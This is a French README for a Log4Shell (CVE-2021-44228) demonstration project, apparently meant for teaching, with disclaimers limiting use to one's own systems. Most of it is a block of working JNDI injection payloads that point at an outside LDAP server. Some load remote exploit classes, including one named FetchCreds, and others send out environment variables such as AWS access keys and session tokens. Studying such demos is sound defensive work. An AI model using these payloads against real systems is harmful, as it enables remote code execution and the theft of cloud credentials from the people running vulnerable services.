# Log4Shell

Ce projet est une démonstration du fonctionnement de la faille de sécurité log4shell.

Cette faille est décrite dans la CVE-2021-44228.

Le projet est destiné à un usage pédagogique uniquement.
Il ne doit être utilisé que sur votre propre système et uniquement dans un but expérimental.

**Toute exécution est effectuée à vos risques et périls.**
**L'auteur décline toute responsabilité en cas d'incident en conséquence de l'exécution du projet.**


## Exemple de commandes
    
    ldap_server=i-09cd4f41e5a2b1d66.eu-west-3.compute.internal:1389
    hello '${jndi:ldap://'"${ldap_server}"'/run=log4shell.Exploit}'
    hello '${jndi:ldap://'"${ldap_server}"'/run=log4shell.ExploitP,msg=my friend}'
    hello '${jndi:ldap://'"${ldap_server}"'/run=log4shell.aws.FetchCreds}'
    hello '${jndi:ldap://'"${ldap_server}"'/log=PATH:${env:USER}}'
    hello '${jndi:ldap://'"${ldap_server}"'/log=PATH:${env:PATH}}'
    hello '${jndi:ldap://'"${ldap_server}"'/log=os=${java:os}}'
    hello '${jndi:ldap://'"${ldap_server}"'/log=aws_credentials,AWS_ACCESS_KEY_ID=${env:AWS_ACCESS_KEY_ID},AWS_SECRET_ACCESS_KEY=${env:AWS_SECRET_ACCESS_ID},AWS_SESSION_TOKEN=${env:AWS_SESSION_TOKEN}}'
    
